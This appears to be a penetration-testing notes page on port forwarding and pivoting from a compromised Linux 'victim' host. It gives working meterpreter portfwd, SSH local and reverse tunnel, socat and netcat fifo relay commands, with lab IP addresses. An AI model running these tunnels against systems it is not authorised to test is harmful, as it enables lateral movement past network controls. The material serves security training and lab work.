# 🐧 Linux

### Metasploit



First we open a shell channel with the objective to obtain the ip. Then thanks to one of the utilities of meterpreter called **portfwd** we perform the port forwarding.

```
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.185.132
```

###

### SSH

With this method we will see that the port forwarding techniques offered by **SSH** are very efficient and secure.&#x20;

They may require a user’s credentials for access log to **SSH**.

Once we have the credentials we can perform two types of redirection, normal and reverse.

The first will consist of redirecting your port 80 to port 8080 local, logging in your **SSH**.

```
ssh -L 8080:localhost:80 -N -f test@172.16.185.132
```



The reverse will consist of connect from a shell of the target to an SSH that we will raise in our machine so in this case we do not need credentials. In this case the port forward occurs in a reverse manner.

```
ssh -R 8080:localhost:80 root@172.16.185.1 -N -f
```



### Socket

We will need to run on our machine a server with Socat that is listening and redirects to the port that we indicate at the second address

```
socat -v TCP4-LISTEN:10000 TCP4-LISTEN:8080
```

Later we will execute the connection in the victim where we indicate the port of the server of our machine and the service that we want to redirect in this case the 80.

```
socat TCP4:172.16.185.1:10000 TCP4:localhost:80
```



### Netcat

First on the victim’s machine we need to execute the command indicated that the first thing it does is create a pipe and then raise a listening port that we will use to connect from our machine, this has to be accessible to us and it is advisable to use one that does not require administrator permissions. The content of the created pipe will be dumped to this port.\
This command concatenated with a | makes the connection to the port of the service to forward in this case the 80 and dumps the answer in our pipe.

```
	
rm -f fifo; mkfifo fifo; nc -v -lk -p 8080 <fifo | nc -v localhost 80> fifo

```

Later on our machine we will use the same procedure to dump the connection to the port that we left to listen to the victim machine in a local port of ours and thus get access in localhost:8080

```
	
rm -f fifo; mkfifo fifo; nc -v -lk -p 8080 <fifo | nc 172.16.185.132 8080> fifo

```

